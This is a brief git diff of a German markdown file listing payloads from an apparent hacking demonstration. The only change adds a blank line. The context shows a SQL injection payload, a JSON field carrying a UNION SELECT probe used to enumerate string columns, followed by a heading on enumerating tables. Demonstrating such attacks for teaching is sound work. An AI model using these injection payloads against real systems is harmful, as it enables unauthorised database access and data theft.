@@ -9,6 +9,7 @@ Im Folgenden findet ihr die verwendeten Payloads der Hacking-Demonstration.
 ## Enumerate strings:
 
 `{"email":"asdf@asldf.adgh","name":"' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--","source":"Friend"}`
+
 Strings sind die Positionen: 3,4,5,6
 
 ## Enumerate Tables:
